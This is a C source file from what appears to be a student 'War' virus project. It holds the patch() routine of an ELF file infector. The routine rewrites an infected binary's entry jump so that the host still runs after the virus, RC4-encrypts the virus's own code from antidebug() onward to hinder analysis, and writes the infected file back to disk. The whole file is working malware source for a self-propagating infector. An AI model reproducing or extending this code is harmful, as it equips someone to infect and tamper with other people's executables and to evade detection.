/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   patch.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/04/04 17:02:59 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/10 20:09:56 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
   Patch -> can be considered as the second part of infect().
   Follow the steps.
*/

void	patch(t_data *data, uint8_t *map, size_t size)
{

#ifdef DEBUG
	char de[] = "patch\t\t0\n";
	data->context == true ?	de[7] = 49 : 0;
	_log(de, _strlen(de));
#endif

	/* revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */

	if (data->context == false || data->context != true)
		goto next;

	data->context = false;
	uint8_t *dst;

	// step 6 : patch entrypoint
	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
	dst = map + (data->virus.note->p_offset + ((size_t)end - (size_t)start));
	while (*dst != 0xe9)
		dst++;
	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
		goto next;
	_memcpy(dst + 1, &data->bin_entry, 4);


	/* // step 6.5 : encrypt infected function inject() */
	/* dst = map + (data->virus.note->p_offset + ((size_t)inject - (size_t)start)); */
	/* revert_one(&data->key, (char*)dst, (size_t)patch - (size_t)inject); */


	// step 7 : Encrypt data : begin at antidebug() -> end lib
	// generate key
	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
	_memcpy(data->cpr_key, (uint8_t*)dst, KEY_SIZE);
	// encrypt
  	dst = map + (data->virus.note->p_offset + ((size_t)antidebug - (size_t)start));
	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)antidebug);

	// final : write
	_write(data->bin.fd, map, size);
	data->context = true;

next:
	_munmap(map, size);
	/* update_one(&data->key, (char*)patch, (size_t)release - (size_t)patch); */
	/* revert_one(&data->key, (char*)release, (size_t)end - (size_t)release); */
	release(data);
}
